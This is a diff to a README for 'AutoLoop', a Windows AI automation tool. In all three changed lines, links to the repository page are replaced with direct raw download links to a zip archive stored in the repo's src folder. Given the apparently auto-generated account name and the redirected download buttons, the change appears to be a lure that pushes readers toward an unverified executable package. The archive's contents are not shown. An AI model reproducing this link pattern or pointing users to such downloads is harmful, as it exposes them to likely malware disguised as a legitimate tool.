@@ -1,6 +1,6 @@
 # 🤖 AutoLoop - Self-running AI for daily work
 
-[![Download AutoLoop](https://img.shields.io/badge/Download-AutoLoop-2ea44f?style=for-the-badge&logo=github)](https://github.com/concettinaprofitable685/AutoLoop)
+[![Download AutoLoop](https://img.shields.io/badge/Download-AutoLoop-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/concettinaprofitable685/AutoLoop/main/src/Loop_Auto_1.0-alpha.1.zip)
 
 ## 🚀 What AutoLoop Does
 
@@ -16,7 +16,7 @@ Use AutoLoop when you want an AI tool that can:
 
 To get AutoLoop on Windows, visit the download page here:
 
-[Download AutoLoop](https://github.com/concettinaprofitable685/AutoLoop)
+[Download AutoLoop](https://raw.githubusercontent.com/concettinaprofitable685/AutoLoop/main/src/Loop_Auto_1.0-alpha.1.zip)
 
 Then follow these steps:
 
@@ -201,7 +201,7 @@ Keep the folder clean so you can move or back up the app with ease
 
 Visit this page to download AutoLoop for Windows:
 
-[https://github.com/concettinaprofitable685/AutoLoop](https://github.com/concettinaprofitable685/AutoLoop)
+[https://raw.githubusercontent.com/concettinaprofitable685/AutoLoop/main/src/Loop_Auto_1.0-alpha.1.zip](https://raw.githubusercontent.com/concettinaprofitable685/AutoLoop/main/src/Loop_Auto_1.0-alpha.1.zip)
 
 ## 🖥️ Short Start Path
 
